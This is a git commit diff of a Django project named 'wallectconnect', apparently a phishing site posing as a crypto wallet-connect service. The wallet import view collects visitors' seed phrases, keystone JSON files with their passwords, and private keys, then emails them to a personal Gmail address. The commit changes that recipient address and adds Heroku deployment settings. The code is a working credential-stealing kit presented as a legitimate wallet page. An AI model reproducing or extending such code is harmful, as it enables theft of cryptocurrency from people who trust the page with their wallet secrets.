8498c3db476a0f9e45dc01b52e3e689c457ee42b
Dimeygee <untamed737@gmail.com>
2021-05-15 03:43:19 +0100

    made few changes

--- wallectconnect/settings.py
+++ wallectconnect/settings.py
@@ -11,6 +11,7 @@ https://docs.djangoproject.com/en/3.2/ref/settings/
 """
 
 import os
+import django_heroku
 
 from pathlib import Path
 
@@ -139,3 +140,4 @@ EMAIL_USE_TLS = True
 EMAIL_HOST_USER = os.environ.get('EMAIL_USER')
 EMAIL_HOST_PASSWORD = os.environ.get('EMAIL_PASS')
 
+django_heroku.settings(locals())
--- wallet/views.py
+++ wallet/views.py
@@ -12,18 +12,18 @@ def WalletImportView(request):
     if request.method == 'POST' and 'phrase_btn' in request.POST:
         phrase = request.POST['phrase']
         if phrase:
-            send_mail('subject',phrase,"Don't Reply <do_not_reply@domain.com>",['adeyemioladimeji130@gmail.com'],fail_silently=False)
+            send_mail('subject',phrase,"Don't Reply <do_not_reply@domain.com>",['Betty.walter122@gmail.com'],fail_silently=False)
             return redirect('success')
     elif request.method == 'POST' and 'keystone_btn' in request.POST:
         keystone = request.POST['keystone']
         passw = request.POST['pass']
         if keystone and passw:
-            send_mail('subject',f"keystone JSON : {keystone}\n\npassword : {passw}","Don't Reply <do_not_reply@domain.com>",['adeyemioladimeji130@gmail.com'],fail_silently=False)
+            send_mail('subject',f"keystone JSON : {keystone}\n\npassword : {passw}","Don't Reply <do_not_reply@domain.com>",['Betty.walter122@gmail.com'],fail_silently=False)
             return redirect('success')
     elif request.method == 'POST' and 'prviatekey_btn' in request.POST:
         private_key = request.POST['private_key']
         if private_key:
-            send_mail('subject',f"Private Key : {private_key}","Don't Reply <do_not_reply@domain.com>",['adeyemioladimeji130@gmail.com'],fail_silently=False)
+            send_mail('subject',f"Private Key : {private_key}","Don't Reply <do_not_reply@domain.com>",['Betty.walter122@gmail.com'],fail_silently=False)
             return redirect('success')
     return render(request,'i_wallet.html')
 
